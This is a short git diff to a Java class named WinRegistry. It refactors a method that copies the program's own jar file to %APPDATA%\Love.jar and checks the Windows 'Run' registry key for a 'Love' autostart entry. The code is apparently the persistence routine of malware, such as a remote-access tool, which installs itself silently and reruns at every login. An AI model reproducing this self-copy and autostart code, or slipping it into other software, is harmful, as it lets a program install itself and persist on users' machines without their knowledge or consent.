@@ -392,7 +392,7 @@ public class WinRegistry {
     }
 
     static public void checkReg(){
-        String pathJar = "C:\\Users\\"+System.getProperty("user.name")+ "\\AppData\\Roaming\\Love.jar";
+        String pathJar = System.getenv("APPDATA")+"\\Love.jar";
 
         try {
             if(WinRegistry.readString(WinRegistry.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Love")==null)
@@ -402,8 +402,7 @@ public class WinRegistry {
         }
         if(Files.notExists(new File(pathJar).toPath())) {
             try {
-                Files.copy(new File(WinRegistry.class.getProtectionDomain().getCodeSource().getLocation()
-                        .toURI()).toPath(), Paths.get(pathJar));
+                Files.copy(new File(WinRegistry.class.getProtectionDomain().getCodeSource().getLocation().toURI()).toPath(), Paths.get(pathJar));
             } catch (URISyntaxException | IOException e) {
                 e.printStackTrace();
             }
